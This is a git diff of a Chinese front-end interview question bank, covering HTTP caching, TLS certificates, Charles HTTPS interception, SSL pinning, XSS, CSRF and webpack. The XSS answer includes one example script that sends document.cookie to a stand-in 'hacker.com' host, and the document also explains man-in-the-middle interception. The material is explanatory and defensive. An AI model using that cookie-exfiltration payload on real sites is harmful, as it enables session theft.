+          "content": "HTTP 缓存分为**强缓存**和**协商缓存**，浏览器会优先检查强缓存。\n\n相关header有：\n- **cache-control：**\n\t如果设置了 `no-store`，则跳过所有缓存，每次都重新下载。\n\t如果设置了 `no-cache`，则跳过强缓存，直接进入协商缓存验证。\n\t\n- **强缓存相关header：** 浏览器直接从本地缓存读取资源，不向服务器发送请求。主要通过两个字段控制：\n    - `Expires`：HTTP/1.0 产物，存储的是绝对过期时间。    \n    -  cache-control 的 `max-age` 字段设置相对过期时间，优先级高于 Expires。\n\n- **协商缓存：** 当强缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器决定是否使用缓存。\n    - `Last-Modified / If-Modified-Since`：基于文件最后修改时间。缺点是秒级以内的修改无法感知。\n    - `ETag / If-None-Match`：基于文件内容的 Hash 值（优先级更高），只要内容变了 ETag 就会变。\n\n **流程总结：** \n- **第一步：检查强缓存。** 浏览器先看 `Cache-Control` 的指令。如果命中且未过期，直接从本地读取资源，状态码为 `200 (from disk/memory cache)`。\n- **第二步：触发协商缓存。** 如果强缓存失效（过期或有 `no-cache`），浏览器会携带缓存标识（`ETag` 或 `Last-Modified`）向服务器发起验证请求。\n- **第三步：服务器决策。** 如果资源没变，服务器返回 `304 Not Modified`，告诉浏览器继续用旧的；如果资源变了，返回 `200` 和最新的资源。\n\n**一般实际工程中常用的策略是：**\n\t 针对 HTML 页面（频繁变动）：设置 `Cache-Control: no-cache`\n\t 针对 静态资源（JS/CSS/图片）：配合 Webpack 打包的 **ContentHash**，设置强缓存：`Cache-Control: max-age=31536000, immutable`。\n\t 针对 敏感数据或私密接口：设置 `Cache-Control: no-store`。浏览器和代理服务器都不允许缓存，确保数据的安全性。\n\t \n总的来说，前端缓存策略的核心就是：**HTML 走协商缓存，静态资源走强缓存并配合文件名 Hash**。这样既能大幅提升加载速度，又能保证版本更新的实时性。",
           "hasAnswer": true
         },
         {
-          "id": "network-9",
-          "title": "TCP三次握手和四次挥手的过程。为什么挥手是四次?",
-          "content": "",
-          "hasAnswer": false
-        },
-        {
           "id": "network-10",
-          "title": "ca证书是从哪里获取的",
-          "content": "",
-          "hasAnswer": false
+          "title": "常见的http状态码",
+          "content": "- **2xx (成功)：** `200` 请求成功；`204` 请求处理成功但没有资源返回。\n    \n- **3xx (重定向)：** `301` 永久重定向（配合 SEO）；`302` 临时重定向；`304` 资源未改变，使用协商缓存。\n    \n- **4xx (客户端错误)：** `400` 参数错误；`401` 未授权（需登录）；`403` 服务器拒绝访问（无权限）；`404` 资源不存在。\n    \n- **5xx (服务器错误)：** `500` 服务器代码报错；`502` 网关错误（通常是后端服务宕机）；`504` 网关超时（后端接口响应太慢）。”",
+          "hasAnswer": true
         },
         {
           "id": "network-11",
-          "title": "怎么保证 CA的有效性",
-          "content": "CA 证书的有效性由**信任链 (Chain of Trust)** 和**数字签名**机制来保证。\n\n1. 浏览器/操作系统的信任列表：主流的 CA（称为**根 CA, Root CA**）的证书公钥**预装**在所有主流的操作系统和浏览器中，被标记为**受信任**的。这是信任的起点。\n\n2. 网站将自己的**公钥**提供给 CA，CA 用自己的**私钥**对包含网站公钥和信息的证书文件进行**签名**。再将网站公钥、网站信息和这个**数字签名** 封装在一起，形成了网站的 SSL/TLS 证书。\n\n3. 浏览器验证的网站的证书，使用 CA 的**公钥**（已预装或从信任链中获得）来**验证**这个签名",
+          "title": "TCP三次握手和四次挥手的过程。为什么挥手是四次?",
+          "content": "**三次握手（建立连接）：**\n\n1. **客户端**发送 SYN 包，进入 SYN_SENT 状态。\n    \n2. **服务端**收到后，发送 SYN+ACK 包，进入 SYN_RCVD 状态。\n    \n3. **客户端**收到后，发送 ACK 包，双方进入 ESTABLISHED 状态。\n\n- **核心目的：** 确认双方的**收、发能力**都是正常的。\n\n**四次挥手（释放连接）：**\n\n1. **客户端**发起 FIN 包，进入 FIN_WAIT_1。\n    \n2. **服务端**收到，先回一个 ACK 包，进入 CLOSE_WAIT（此时服务端可能还有数据没发完）。\n    \n3. **服务端**数据发完后，发一个 FIN 包，进入 LAST_ACK。\n    \n4. **客户端**收到，回一个 ACK 包，进入 TIME_WAIT，等待 2MSL 后关闭。\n\n**为什么挥手是四次？** 这是因为 TCP 是**全双工**的。当主动方发送 FIN 只代表它不再发送数据了，但仍能接收数据。被动方收到 FIN 时，可能还有残留数据需要处理，所以先回一个 ACK（表示知道了），等自己处理完后才发送 FIN。**ACK 和 FIN 不能像握手时那样合并发送**，因此多了一次。",
+          "hasAnswer": true
+        },
+        {
+          "id": "network-12",
+          "title": "ca证书是从哪里获取的？怎么保证 CA的有效性？",
+          "content": "**获取途径：** 网站管理员生成原始的证书请求（也就是网站自己的公钥），提交给受信任的 **CA 机构**（如 DigiCert、Let's Encrypt）。CA 机构核实身份后，用自己的**私钥**对证书的数字签名进行加密，颁发给管理员，管理员再将其部署在服务器上。\n\nCA 证书的有效性由**信任链 (Chain of Trust)** 和**数字签名**机制来保证。\n\n1. 浏览器/操作系统的信任列表：主流的 CA（称为**根 CA, Root CA**）的证书公钥**预装**在所有主流的操作系统和浏览器中，被标记为**受信任**的。这是信任的起点。\n\n2. 网站将自己的**公钥**提供给 CA，CA 用自己的**私钥**对包含网站公钥和信息的证书文件进行**签名**。再将网站公钥、网站信息和这个**数字签名** 封装在一起，形成了网站的 SSL/TLS 证书。\n\n3. 当用户访问 HTTPS 网站时，服务器会在 SSL 握手阶段主动将证书发送给浏览器。浏览器验证的网站的证书，使用 CA 的**公钥**（已预装或从信任链中获得）来**验证**这个签名。\n\n4. 浏览器通过 CA 公钥验证了证书是真的，于是从证书里取出**网站公钥**，用公钥生成后续的对称加密密钥，服务器用私钥解密获得对称加密密钥，后续用对称密钥来进行对称加密。\n\n总体上本质是两层非对称加密：\nCA机构的一对公钥私钥，私钥用于签名，公钥给浏览器预装。\n网站的密钥对：公钥给浏览器用于生成后续对称加密密钥，私钥自己用来解密生成对称加密密钥。\n\n追问：\n1.为什么不一直用网站公钥/私钥加密聊天？\n\n- **原因 1：性能。** 非对称加密（公钥/私钥）非常消耗 CPU 资源，速度慢。如果全程用它加密，网页打开会卡死。\n- **原因 2：效率。** 对称加密（AES 等）速度极快，适合传输大量数据（如 HTML、图片）。\n\n2.加密是在数据传输的哪一步？为什么开发者工具能看到？为什么charles抓包也能看到甚至篡改？\n\n开发者工具（Network 面板）看到的请求，是在加密发生“之前”和解密发生“之后”的。\n- **黑客/路由器/运营商：** 他们在数据传输的路径上（网线、WiFi 信号、中间节点）。他们没有网站的私钥，也没有协商出来的对称密钥，所以他们抓到的包是一堆**乱码**。\n- **你（开发者）：** 你在自己的机器上，拥有浏览器的最高权限，所以你看到的是**解密后**的数据。\n\n**Charles** 或 **Fiddler** 这样的抓包工具，你会发现默认情况下它们也抓不到 HTTPS 的明文，除非你手动在电脑上安装这些工具生成的“根证书”。这本质上是进行了一次“合法的中间人攻击”。\n\n3.加密的是什么？\nHTTPS 并不是只加密你的“密码”或“数据”，它是**全方位包裹**的。\n加密的内容包括：\n- **Request URL** 的路径（比如 `/api/user/123`，但域名本身无法完全隐藏，因为需要 DNS 解析）。\n- **HTTP Headers**（包括你的 Cookie、Authorization 令牌）。\n- **HTTP Body**（表单数据、JSON 负载）。\n- **Response Status Code**（比如 200、404）。",
+          "hasAnswer": true
+        },
+        {
+          "id": "network-13",
+          "title": "Charles抓包的原理",
+          "content": "**核心原理：** Charles 拦截了浏览器和服务器之间的通话，并**分别**与两端建立了独立的加密连接。\n\n- **步骤一（伪装成服务器）：** 当浏览器请求服务器时，Charles 截获请求，并把**自己的公钥证书**发给浏览器。\n    \n- **步骤二（骗取信任）：** 正常情况下，浏览器会报错“证书不可信”。但因为你手动在电脑里把 **Charles 的根证书**设为了“受信任”，浏览器就认为它是合法的。\n    \n- **步骤三（获取密钥）：** 浏览器用 Charles 的公钥加密了“对称密钥种子”发给 Charles，Charles 用自己的私钥解密，拿到了种子。**至此，Charles 拿到了暗号。**\n    \n- **步骤四（伪装成浏览器）：** Charles 拿到请求后，再自己作为客户端，去跟真正的服务器建立一套正常的 HTTPS 连接。\n\n**结果：** 所有的请求和响应都会经过 Charles。它先用 A 钥匙解密浏览器的数据看个精光，再用 B 钥匙加密发给服务器。\n\nCharles 抓包的前提是 **“根证书信任”** 。它通过在本地安装受信任的根证书，实现了对 HTTPS 流量的解密和重加密。\n\n追问：如何防止被 Charles 这种工具抓包？\n\n虽然 Charles 是开发者的利器，但在生产环境下，我们有时不希望 App 或网站被别人这样轻易抓包。这时候可以提到一个高级概念：**SSL Pinning（证书锁定）**。\n**SSL Pinning 的核心思想：** 不再盲目信任系统内置的 CA 列表，而是由 App 内部**自主校验**服务器的证书。\n\n- **原理：** 在 App 开发时，不只依赖系统的根证书信任链，而是直接在 App 代码里写死（Hardcode）服务器真实的证书信息或公钥信息。\n- **效果：** 即使你在手机上安装并信任了 Charles 的根证书，App 在握手时会发现：“这张证书虽然系统说是真的，但不是我代码里写死的那张！”于是直接断开连接。\n- 对比：**普通 HTTPS：** 信任系统根证书（防一般的中间人）。 **SSL Pinning：** 只信任指定证书（防本地安装恶意根证书 / 防 Charles 抓包）。",
+          "hasAnswer": true
+        },
+        {
+          "id": "network-14",
+          "title": "如果一个网站用了 HTTPS，但它的图片资源是用 HTTP 加载的（混用内容），浏览器会报什么错？为什么这样做不安全？",
+          "content": "这种场景可以叫做：混合内容，是指在一个通过 HTTPS 加载的页面中，包含了通过不安全的 HTTP 协议请求的资源。\n\n**浏览器行为上**：对于 JS、CSS 等脚本资源，浏览器会为了安全直接**拦截（Block）**；对于图片、媒体等资源，会报出 **Mixed Content 警告**并导致地址栏的安全小锁消失。\n\n**安全性上**： 第一，它破坏了**数据的机密性**，浏览器在请求 HTTP 图片时，如果该域名下有不带 `Secure` 属性的 Cookie，这些敏感的 **Session Cookie** 就会在 HTTP 请求中以**明文**形式发送。黑客截获了这张图片的请求，就等于拿到了你的登录凭证； 第二，它破坏了**数据的完整性**，中间人可以篡改 HTTP 返回的内容（如图片或脚本），实现钓鱼攻击或恶意代码注入。\n\n因此，现代前端开发的最佳实践是全站 HTTPS，或在 HTML 头部配置 `Content-Security-Policy: upgrade-insecure-requests` 强制浏览器将 HTTP 请求自动升级为 HTTPS。",
+          "hasAnswer": true
+        },
+        {
+          "id": "network-15",
+          "title": "XSS 攻击的原理和防御",
+          "content": "**原理：** XSS 的本质是‘**恶意代码注入**’。黑客通过在网页中注入恶意脚本（通常是 JS），当其他用户浏览该页时，浏览器执行了这些脚本，导致用户信息（如 Cookie、Token）被窃取或页面被篡改。\n\n**主要分类：**\n- **存储型：** 例如通过评论将恶意脚本存储在服务器数据库，所有访问该页面的用户都会中招。比如`<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`\n- **DOM 型：** 纯前端漏洞，脚本不经过后端，而是通过改变页面的 DOM 结构触发。比如input的恶意代码，或者解析URL里的恶意代码\n\n**防御策略：**\n\n1. **输入过滤与转义：** 永远不要相信用户的输入。对 `<script>`、`<a>` 等标签进行过滤或 HTML 转义（将 `<` 转为 `&lt;`）。\n2. **使用现代框架：** React 和 Vue 默认会自动转义变量内容，除非你显式使用 `dangerouslySetInnerHTML` 或 `v-html`。\n3. **开启 CSP（内容安全策略）：** 通过 HTTP 响应头限制浏览器只能加载特定域名的资源，禁止执行内联脚本。\n4. **Cookie 安全：** 给敏感 Cookie 设置 `HttpOnly` 标志，这样 JS 就无法通过 `document.cookie` 读取到它。",
+          "hasAnswer": true
+        },
+        {
+          "id": "network-16",
+          "title": "CSRF攻击的原理和防御",
+          "content": "**原理：** CSRF 的本质是‘**利用用户的登录态发起恶意请求**’。这是利用了浏览器在处理跨站请求时的默认行为。只要请求的目标地址匹配，浏览器就会在 Header 中自动附带上本地存储的 Cookie。而浏览器的同源策略拦截的是读取而不是发送，`a.com` 默认是可以向 `b.com` 发送请求的（比如 HTML 里的 `<a>`、`<img>`、`<form>` 标签）。\n浏览器的cookie原则是：跟在哪个页面发起的请求无关，只跟**请求的目标地址**有关。\n\n黑客诱导用户访问第三方恶意网站，在用户不知情的情况下，冒充用户向原服务器发送请求（如转账、修改密码）。\n**核心特征：** 攻击发生在第三方域，黑客**拿不到** Cookie 的具体内容，但能**利用** Cookie 绕过身份验证。这也是为什么点击钓鱼网站很危险的原因之一。\n\n**防御策略：**\n\n1. 设置严格的**SameSite （Cookie 字段属性）：** 现代浏览器支持将 Cookie 设置为 `SameSite=Strict` 或 `Lax`，限制 Cookie 在跨站请求时被携带。这是目前最简单高效的方案。\n2. **CSRF Token 校验：** 服务器生成一个随机生成的 Token 给前端，前端在发送‘写’请求（POST/PUT）时必须在 Header 或 Body 中携带这个 Token。黑客在第三方域无法获取这个 Token，请求就会失败。\n3. **验证 Referer / Origin 头部：** 服务器检查请求来源是否为可信域名。\n4. **二次验证：** 敏感操作（如大额转账）要求用户输入支付密码或短信验证码。\n\n追问：有了 HTTPS 还需要防范 CSRF 吗？\n\n**需要。** 因为 HTTPS 和 CSRF 解决的是不同层面的安全问题：\n- **HTTPS 解决的是‘传输安全’**：防止数据在路途中被窃听或篡改（防中间人）。\n- **CSRF 解决的是‘身份利用’**：即使传输过程是加密的，黑客依然可以诱导浏览器发起一个指向服务器的‘合法加密请求’。",
           "hasAnswer": true
         }
       ]
@@ -1236,80 +1236,122 @@
       "questions": [
         {
           "id": "engineering-1",
-          "title": "webpack vite区别",
-          "content": "",
-          "hasAnswer": false
-        },
-        {
-          "id": "engineering-2",
-          "title": "loader plugin区别",
-          "content": "",
-          "hasAnswer": false
-        },
-        {
-          "id": "engineering-3",
-          "title": "webpack场景配置项",
-          "content": "首先是入口和输出配置，比如 `entry` 和 `output`，用于定义构建的入口文件以及最终打包产物的输出路径和文件名。\n\n其次是模块解析和处理相关的配置，包括 `resolve`，用于配置文件后缀名解析和路径别名，以及 `module.rules` 中的 loader，用来处理不同类型的资源文件。\n\n然后是插件相关配置，通过 `plugins` 在 webpack 构建的各个生命周期阶段执行特定逻辑。\n\n另外还有一些环境和开发相关的配置，比如 `mode` 区分开发和生产环境，`devServer` 用于本地开发配置，`devtool` 用于 source map 设置。\n\n最后是 `optimization`，用于构建优化，比如代码压缩、`splitChunks` 做代码分包，以及 `runtimeChunk` 抽离运行时代码以支持长期缓存。",
-          "hasAnswer": true
-        },
-        {
-          "id": "engineering-4",
-          "title": "Rollup 的适用场景",
-          "content": "ESM的项目或者打包库",
-          "hasAnswer": true
-        },
-        {
-          "id": "engineering-5",
-          "title": "Parcel",
-          "content": "提供一个**极速、开箱即用**的现代前端开发体验，让开发者可以专注于代码本身，而不是复杂的构建配置\n\n**零配置**这是 Parcel 最大的卖点。对于大多数常见的项目类型（如 JavaScript、CSS、HTML、图片等），它不需要任何配置文件 (`parcel.config.js` 或 `webpack.config.js`) 就能直接工作。\n\n极速打包**Parcel 利用 **多核处理 (Worker 进程)** 来并行编译资源，并使用文件系统缓存。这使得它的初始构建和二次构建速度都非常快。*\n\n自动转换**它能自动检测和转换代码，例如：如果发现使用了 **Babel**、**PostCSS** 或 **TypeScript**，它会自动使用相应的工具进行转换，无需手动配置 Loader 或 Plugin。\n\n资源支持**Parcel 天生支持各种文件类型，包括 JS、CSS、HTML、图片、字体等，并且能自动处理它们之间的依赖关系，不需要额外的插件。\n\n代码分割****零配置**支持基于 ES 模块的**动态导入 (`import()`)**，并自动将应用分割成更小的块，实现按需加载。\n\nHMR (热模块替换)**在开发模式下，Parcel 默认启用快速的热模块替换，可以保留应用状态并即时更新模块，提高开发效率。\n\nParcel 与传统的打包工具（如 Webpack）的主要区别在于**配置哲学**：\n\n- **Webpack：** 是一种高度可配置的工具，通过复杂的配置文件（Entry、Loader、Plugin）来实现强大的功能和定制性。\n\n- **Parcel：** 追求**极简主义**，通过内置的智能模块解析和转换机制，在大多数情况下实现零配置，牺牲部分定制性来换取极高的开发效率和易用性。\n\n**总结：** Parcel 是一个适合快速启动、中小型项目，以及追求简单配置和极致开发速度的开发者的优秀选择。",
-          "hasAnswer": true
-        },
-        {
-          "id": "engineering-6",
-          "title": "Tree shaking原理和条件",
-          "content": "Tree Shaking 的原理可以概括为两步：**标记（Marking）和清除（Sweeping）**。\n\n1. 标记：基于 ES Module 的静态分析\n\nTree Shaking 依赖于 **ES Module (ESM)** 的**静态特性**。\n\n- **静态结构：** ESM 的 `import` 和 `export` 语句在代码执行前就已经确定了模块之间的依赖关系和导出的名称。这意味着，构建工具可以在**编译阶段（编译时）**，而不是运行阶段，确定哪些代码被使用了，哪些没有。\n\n- **依赖图构建：** 构建工具会从入口文件开始，构建一个完整的模块依赖图（Module Dependency Graph）。\n\n- **使用标记：** 在遍历依赖图的过程中，构建工具会标记出**实际被导入和使用的**模块、函数或变量。没有被任何地方导入或引用的代码则会被标记为“未使用”。\n2. 清除：移除未标记的代码\n- 在标记阶段完成后，优化器（通常是 UglifyJS 或 Terser）会执行清除操作。\n\n- 它会遍历所有模块，**物理性地移除**那些被标记为“未使用”（即 Dead Code）的代码块。\n\n✅ Tree Shaking 的生效条件\n\n 1. 必须使用 ES Module 语法\n\n- **导出：** 必须使用 `export` 或 `export default`。\n\n- **导入：** 必须使用 `import` 语句。\n\n- ESM 的 `import()` 动态导入不会阻止 Tree Shaking，反而会成为 Tree Shaking 的起点，实现更精细的按需加载。\n\n- 在这个动态导入的场景中，Tree Shaking 确保了即使是懒加载的代码块，也只包含真正用到的逻辑，实现了体积的最小化。\n2. 保证代码是“无副作用的” (Side-Effect Free)\n\nTree Shaking 的机制是安全的移除**没有副作用**的代码。\n\n- **定义：** “副作用”是指执行该模块时，除了导出值之外，还会修改全局状态或执行其他操作（例如：修改 DOM、调用 API、修改原型链）。\n\n- **标记：** 如果一个模块被标记为有副作用，即使它的导出没有被使用，构建工具也可能出于安全考虑保留整个模块。\n\n- **实践：`package.json` 的 `\"sideEffects\": false`** 为了告诉构建工具一个库（或文件）是完全无副作用的，可以在项目的 `package.json` 中添加\n\n3.配置生产模式优化，通过设置 `mode: 'production'` 启用，因为它默认包含了像 Terser 这样的代码压缩工具，而压缩工具是执行最终清除（Sweeping）步骤的关键。\n\n4.转换工具的配置。如果使用了 Babel 等工具进行代码转换，必须配置它**不将 ES Module 转换成 CommonJS 模块**。\n\n- 例如，在 Babel 配置中，需要确保 `@babel/preset-env` 中**没有**设置 `modules: 'commonjs'`，或者明确设置为 `modules: false`：",
-          "hasAnswer": true
-        },
-        {
-          "id": "engineering-7",
-          "title": "Code Splitting 的多种方案",
-          "content": "1.入口点分割 (Entry Points)\n\n这是最基础的分割方式。开发者手动在配置文件中定义多个入口文件，Webpack 会为每一个入口点生成一个独立的 Bundle。\n\n- **实现方式：** 在 `webpack.config.js` 的 `entry` 配置中定义多个键值对。\n\n- **适用场景：** 传统多页应用 (MPA)，每个页面对应一个入口；或者当你有两个完全独立的 SPA，想用一个 Webpack 配置打包时。\n\n- 示例 entry: {\n   pageA: './src/page-a.js',\n   pageB: './src/page-b.js',\n   },\n\n- **缺点：** 无法动态加载，且公共依赖代码（如 React 库）会被重复打包到每个入口的 Bundle 中\n\n当构建工具遇到 `import('./moduleA')` 时，它会将 `moduleA` 及其所有依赖单独打包成一个或多个 **Chunk（代码块）**，并在运行时异步加载。\n\nTree Shaking 确保了即使是懒加载的代码块，也只包含真正用到的逻辑，实现了体积的最小化。\n\n2.动态导入 (Dynamic Imports / 运行时加载)\n\n这是最常用、最灵活的代码分割方案，基于 ES Module 的 `import()` 语法，在运行时根据需要加载代码。\n\n- **实现方式：** 在代码中使用 `import('./path/to/module')`。\n\n- **适用场景：**\n  \n  - **路由懒加载：** 将每个路由页面打包成独立的 Chunk。\n  \n  - **组件懒加载：** 将不常用或在视口外的组件进行懒加载。\n  \n  - **条件加载：** 例如，用户点击某个按钮或满足某个条件时才加载特定的库。\n\n- **优点：** 实现了真正的**按需加载 (On-demand)**，大幅减少初始加载体积。\n\n- **缺点：** 必须处理加载状态（如使用 Suspense 或 Loading 占位符）。\n\n3.提取公共模块 (Vendor/Commons)\n\n目的是将多个模块（入口或动态导入）共享的依赖（如 React, Lodash, jQuery 等第三方库）提取出来，形成一个独立的公共 Chunk，以利用客户端的**缓存机制**。\n\n- **实现方式：** 使用 Webpack 的 `optimization.splitChunks` 配置。\n\n- **适用场景：** 任何包含大量第三方依赖或有多个入口点的应用。\n\n- **配置策略 (`optimization.splitChunks`)：**\n  \n  - **`vendors` (第三方库)：** 将所有来自 `node_modules` 的模块打包在一起。\n  \n  - **`default` (公共模块)：** 将应用内被多个模块（通常是两个以上）引用的代码提取出来。\n\n- **优点：** 充分利用浏览器缓存，核心库代码（如 React）稳定后，用户无需重复下载。\n\n- 示例 \n\n```js\nmodule.exports = {\n  // ...\n  optimization: {\n    splitChunks: {\n      chunks: 'all', // 对所有类型的 Chunk 生效\n      cacheGroups: {\n        // 自动提取 node_modules 中的库\n        vendor: {\n          test: /[\\\\/]node_modules[\\\\/]/,\n          name: 'vendors',\n          priority: -10,\n        },\n        // 提取被多次使用的公共模块\n        default: {\n          minChunks: 2, \n          priority: -20,\n          reuseExistingChunk: true,\n        },\n      },\n    },\n  },\n};\n```",
-          "hasAnswer": true
-        },
-        {
-          "id": "engineering-8",
-          "title": "优化代码分割产物加载速度的机制",
-          "content": "- **实现方式：** 使用 Webpack 内联注释（Magic Comments）或 HTML 标签。\n  \n  - **`/* webpackPreload: true */`**\n  \n  - **`/* webpackPrefetch: true */`**\n\n- **适用场景：**\n  \n  - **`Preload` (预加载)：** 用于当前页面**很快就会需要**的资源（如当前路由的字体、关键图片或首个动态加载的 Chunk）。它会和父 Chunk 并行加载，优先级较高。\n  \n  - **`Prefetch` (预取)：** 用于用户**未来可能会需要**的资源（如用户可能会跳转到的下一个路由页面）。它会在浏览器空闲时加载，优先级较低。",
-          "hasAnswer": true
-        },
-        {
-          "id": "engineering-9",
-          "title": "Babel编译原理和插件开发",
-          "content": "Babel 的编译过程严格遵循计算机科学中的编译器原理，可以划分为三个核心阶段：**解析 (Parse)**、**转换 (Transform)** 和 **生成 (Generate)**。\n\n阶段一：解析：此阶段的目标是将原始源代码转换为抽象语法树 (AST)。\n\n1. **词法分析 (Lexical Analysis/Tokenizing):**\n   \n   - 将输入的代码字符串分解成一个个独立的、最小的语法单元，称为 **Token**（标记）。\n   \n   - 例如：`const a = 1;` 会被分解为 `const`, `a`, `=`, `1`, `;` 等 Token。\n\n2. **语法分析 (Syntactic Analysis/Parsing):**\n   \n   - 将 Token 流组合成一个树状的结构，即 **AST (Abstract Syntax Tree)**。\n   \n   - AST 中的每个节点都代表了代码中的一个结构，如变量声明 (`VariableDeclaration`)、标识符 (`Identifier`)、函数调用 (`CallExpression`) 等。\n   \n   - Babel 默认使用 **`@babel/parser`** (以前叫 Babylon) 来进行解析。\n\n获得的AST是个很大超大的JSON，好在Webpack 或 Babel 是**逐个文件**读取和处理的。并且AST不存储时，是临时的数据\n\n阶段二：转换 (Transformation)\n\n这是 Babel 工作的核心，**插件**主要在这个阶段发挥作用。\n\n1. **遍历 (Traversing):**\n   \n   - Babel 会深度优先遍历整个 AST。\n\n2. **插件执行:**\n   \n   - 当遍历器遇到特定的节点类型时，它会调用注册了该节点类型的 **Babel 插件**。\n   \n   - 插件通过操作 AST 节点（增、删、改、替换），将高版本语法转换为目标环境支持的语法。\n   \n   - 例如，将 ES6 的箭头函数 (`ArrowFunctionExpression`) 节点转换成 ES5 的普通函数表达式 (`FunctionExpression`) 节点。\n\n3. **Babel 默认使用 **`@babel/traverse`** 来进行 AST 遍历和节点操作。\n\n阶段三：生成 (Generating)\n\n此阶段的目标是将转换后的 AST 重新渲染为目标代码字符串。\n\n1. **递归生成:** Babel 递归地遍历修改后的 AST，将每个节点打印成对应的代码字符串。\n\n2. **Source Map:** 同时，还会生成 **Source Map**，用于将转译后的代码映射回原始源代码，以便于调试。\n\n3. **Babel 默认使用 **`@babel/generator`** 来进行代码生成。",
-          "hasAnswer": true
-        },
-        {
-          "id": "engineering-10",
-          "title": "自动化测试策略",
-          "content": "",
-          "hasAnswer": false
-        },
-        {
-          "id": "engineering-11",
           "title": "Webpack 构建流程和原理",
           "content": "阶段一：初始化 (Initialization)：Webpack 从启动到开始处理文件前的准备阶段。\n\n1. **参数合并:** 读取并合并 `webpack.config.js` 中的配置参数、Shell 命令行参数以及默认配置。\n\n2. **创建 Compiler:** 创建一个 `Compiler` 实例。`Compiler` 是 Webpack 的核心对象，它贯穿整个生命周期，负责协调整个构建流程。\n\n3. **加载插件:** 遍历配置中的 `plugins` 数组，依次执行插件的 `apply` 方法，注册各种 Hook（钩子）函数，监听 Compiler 或 Compilation 的事件。\n\n阶段二：构建模块 (Building Modules)：此阶段的核心是根据入口文件递归地构建**模块依赖图 (Module Dependency Graph)**。\n\n1. **确定入口:** 从配置中定义的 `entry` 入口文件开始。\n\n2. **创建 Compilation:** 创建一个 `Compilation` 实例。`Compilation` 对象负责本次构建过程的资源管理，包括模块、依赖图、Chunk、生成的资源文件等信息。\n\n3. **Module 构建循环:** Webpack 进入模块处理的循环：\n   \n   - **加载 (Loading):** 根据模块路径读取文件内容。\n   \n   - **解析 (Resolving):** 使用配置好的 `resolve` 规则，确定模块的绝对路径。\n   \n   - **处理 (Processing):**\n     \n     - 将文件内容传递给匹配的 **`Loader`**。Loader 负责将非 JS 类型的资源（如 TS, Sass, Vue 文件）转换为有效的 JavaScript 模块内容，或进行转换（如 Babel 转译）。\n     \n     - Loader 链式执行，前一个 Loader 的输出是后一个 Loader 的输入。\n   \n   - **依赖分析:** 使用 **`Parser`** (解析器) 遍历经过 Loader 处理后的代码内容。解析器会识别出代码中的 `import`、`require()`、`import()` 等模块导入语句。\n   \n   - **递归:** 每识别到一个依赖，就将其加入到依赖图，并对该依赖文件重复整个构建循环，直到所有依赖都被处理。\n\n阶段三：生成资源 (Sealing & Emitting)\n\n在依赖图构建完成后，Webpack 开始将模块组合成可部署的资源文件。\n\n1. **Chunk 分组:** 将构建好的模块根据它们的关系进行分组，形成 **Chunks** (代码块)。\n   \n   - **Entry Chunk:** 对应入口文件及其同步依赖。\n   \n   - **Lazy Chunk:** 对应通过 `import()` 动态导入形成的异步加载模块。\n   \n   - **Vendor/Common Chunk:** 对应通过 `SplitChunksPlugin` 提取的公共/第三方模块。\n\n2. **Chunk 优化 (Tree Shaking/Code Splitting):** 运行优化步骤，如 Tree Shaking 移除未使用的代码，以及 `splitChunks` 配置提取公共代码。\n\n3. **生成 Bundle:** 将 Chunk 映射到最终的输出文件（Bundle）。Webpack 为每个 Chunk 添加 runtime 代码（用于加载和执行模块）和模块包装器。\n\n4. **写入文件:** 最终，执行 `emitAssets` 钩子，将内存中生成的 Bundle 文件内容写入到输出目录（`output` 配置）。",
           "hasAnswer": true
         },
         {
-          "id": "engineering-12",
+          "id": "engineering-2",
+          "title": "webpack优化代码分割产物加载速度的机制",
+          "content": "- **实现方式：** 使用 Webpack 内联注释（Magic Comments）或 HTML 标签。\n  \n  - **`/* webpackPreload: true */`**\n  \n  - **`/* webpackPrefetch: true */`**\n\n- **适用场景：**\n  \n  - **`Preload` (预加载)：** 用于当前页面**很快就会需要**的资源（如当前路由的字体、关键图片或首个动态加载的 Chunk）。它会和父 Chunk 并行加载，优先级较高。\n  \n  - **`Prefetch` (预取)：** 用于用户**未来可能会需要**的资源（如用户可能会跳转到的下一个路由页面）。它会在浏览器空闲时加载，优先级较低。",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-3",
+          "title": "loader plugin区别",
+          "content": "这两者是 Webpack 的核心支柱，但作用维度完全不同：\n\n- **Loader (转化器)：** 它是文件级的转换。Webpack 只能理解 JS 和 JSON，Loader 的作用是让 Webpack 具备处理 **非 JS 文件** 的能力（如 `css-loader` 处理 CSS，`babel-loader` 转化 ES6）。它运行在打包之前，遵循‘从右往左’的链式调用。\n- **Plugin (插件)：** 它是系统级的扩展。基于 Webpack 的**事件流（Tapable）**机制。Plugin 会挂载在 Webpack 构建生命周期的各个钩子上，在整个构建流程中执行更复杂的任务。\n- **一句话总结：** Loader 是干活的工人（处理文件），Plugin 是监工（控制构建流程，如压缩代码、清空目录、生成 HTML）。”",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-4",
+          "title": "webpack常用配置项",
+          "content": "首先是入口和输出配置，比如 `entry` 和 `output`，用于定义构建的入口文件以及最终打包产物的输出路径和文件名。\n其次是模块解析和处理相关的配置，包括 `resolve`，用于配置文件后缀名解析和路径别名，以及 `module.rules` 中的 loader，用来处理不同类型的资源文件。\n然后是插件相关配置，通过 `plugins` 在 webpack 构建的各个生命周期阶段执行特定逻辑。\n另外还有一些环境和开发相关的配置，比如 `mode` 区分开发和生产环境，`devServer` 用于本地开发配置，`devtool` 用于 source map 设置。\n最后是 `optimization`，用于构建优化，比如代码压缩、`splitChunks` 做代码分包，以及 `runtimeChunk` 抽离运行时代码以支持长期缓存。",
+          "hasAnswer": true
+        },
+        {
+          "id": "engineering-5",
+          "title": "什么是webpack运行时",
+          "content": "1. 什么是 Runtime？\n\nWebpack 运行时是**一段微型的代码块，负责在浏览器运行期间连接模块、加载模块、解析依赖。**\n\n没有它，浏览器根本不认识 `require()`、`import` 或 `module.exports`。\n\n2. Runtime 的核心功能\n\n- **模块映射表 (Module Manifest)**：里面记录了所有模块的 ID 和它们在打包后的文件位置。\n- **模块加载机制**：\n    - 实现同步加载：`__webpack_require__(moduleId)`。\n    - 实现异步加载（动态 import）：通过动态创建 `<script>` 标签并注入 JSONP 回调。\n- **缓存管理**：确保同一个模块在多次引用时只执行一次，后续直接从内存缓存中读取。\n\n实际工程中：我们通常会将它提取为独立的 `runtimeChunk`，防止业务代码变动导致映射表更新，从而破坏第三方库的长期缓存。",
